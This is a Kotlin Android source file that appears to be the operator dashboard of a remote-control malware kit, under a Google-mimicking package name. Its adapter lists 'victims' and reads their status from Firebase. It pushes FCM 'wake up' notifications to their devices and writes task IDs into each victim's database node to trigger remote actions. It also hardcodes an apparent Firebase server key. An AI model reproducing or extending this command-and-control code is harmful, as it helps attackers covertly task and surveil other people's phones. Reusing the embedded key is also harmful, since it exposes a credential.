package com.googli.gttsedashboard

import android.app.AlertDialog
import android.content.Context
import android.content.DialogInterface
import android.content.Intent
import android.os.AsyncTask
import android.support.v4.content.ContextCompat
import android.support.v7.widget.RecyclerView
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.widget.EditText
import android.widget.ImageView
import android.widget.RelativeLayout
import android.widget.TextView
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import org.json.JSONException
import org.json.JSONObject
import java.util.HashMap


class victimAdaptor(val context: Context, var VictimList: ArrayList<Victim>) : RecyclerView.Adapter<victimAdaptor.victimViewHolder>() {
    val holderList = ArrayList<victimViewHolder>()
    override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): victimViewHolder {
        return victimViewHolder(LayoutInflater.from(parent.context).inflate(R.layout.row_layout, parent, false))
    }

    override fun getItemCount(): Int {
        return VictimList.size
    }

    override fun onBindViewHolder(holder: victimViewHolder, position: Int) {
        holder.Name.text = VictimList[position].Name
        holderList.add(holder)
        holder.refreshVictims(VictimList[position].Name)
    }

    fun sendNotification(FCMToken: String, title: String, details: String) {
        val jsonObject = JSONObject()
        val jsonObjectData = JSONObject()
        val jsonNotification = JSONObject()
        try {
            jsonObject.put("to", FCMToken)
            jsonObject.put("priority", "high")


            jsonObjectData.put("data1", "Hello")

            jsonNotification.put("title", title)
            jsonNotification.put("text", details)
            jsonObject.put("data", jsonObjectData)
            jsonObject.put("notification", jsonNotification)

        } catch (e: JSONException) {

        }

        val url = "https://fcm.googleapis.com/fcm/send"
        val mQueue = Volley.newRequestQueue(context)

        val jsonObjectRequest = object : JsonObjectRequest(Request.Method.POST, url, jsonObject,
                { response ->

                    Log.d("TAG", response.toString())

                }, { error ->

            Log.e("TAG", error.message, error)

        }) {


            override fun getHeaders(): MutableMap<String, String> {
                val map = HashMap<String, String>()
                map.put("Content-Type", "application/json")
                map.put("Authorization", "key=AIzaSyDS1vTPrXmW6J3mce_VE0XDmEHOCZcrfqM")
                return map
            }

        }

        mQueue.add(jsonObjectRequest)

    }

    fun refreshVictims() {
        AsyncTask.execute {
            for (victim in VictimList) {
                FirebaseDatabase.getInstance().reference.child(victim.Name).child("Task").child("TaskID").setValue(10)
            }
            for (victim in VictimList) {
                FirebaseDatabase.getInstance().reference.child(victim.Name).child("Task").child("TaskID").setValue(100)
            }
            Thread.sleep(5000)
            for (holder in holderList) {
                if (holder.Row.background != ContextCompat.getDrawable(context, R.color.Green)) {
                    holder.Row.background = ContextCompat.getDrawable(context, R.color.Red)
                }
            }
        }


    }

    fun createDialog(token: String, name: String) {
        val dialogView = LayoutInflater.from(context).inflate(R.layout.notification_details_layout, null)
        dialogView.findViewById<TextView>(R.id.VictimName).text = name
        AlertDialog.Builder(context).setView(dialogView)
                .setPositiveButton("Send") { dialog, which ->
                    sendNotification(token, dialogView.findViewById<EditText>(R.id.NotificationTitle).text.toString()
                            , dialogView.findViewById<EditText>(R.id.NotificationDetails).text.toString())
                }
                .setNegativeButton("Cancel") { dialog, which ->
                }
                .show()
    }

    inner class victimViewHolder(view: View) : RecyclerView.ViewHolder(view) {
        var Name = view.findViewById<TextView>(R.id.Name)
        var WakeUp = view.findViewById<ImageView>(R.id.WakeUp)
        var Row = view.findViewById<RelativeLayout>(R.id.Row)


        init {
            WakeUp.setOnClickListener {
                println(adapterPosition.toString())
                createDialog(VictimList[adapterPosition].token, VictimList[adapterPosition].Name)
            }
            Row.setOnClickListener {
                context.startActivity(Intent(context, TaskActivity::class.java).putExtra("Name", VictimList[adapterPosition].Name).putExtra("Status", VictimList[adapterPosition].status))
            }


        }

        fun refreshVictims(name: String) {


            FirebaseDatabase.getInstance().reference.child(name).child("Status").addValueEventListener(object : ValueEventListener {
                override fun onCancelled(p0: DatabaseError?) {
                    TODO("not implemented") //To change body of created functions use File | Settings | File Templates.
                }

                override fun onDataChange(p0: DataSnapshot?) {
                    if (p0!!.value != VictimList[adapterPosition].status) {
                        Row.background = ContextCompat.getDrawable(context, R.color.Green)
                        VictimList[adapterPosition].status = p0.value.toString()
                    }
                }
            })

        }

    }
}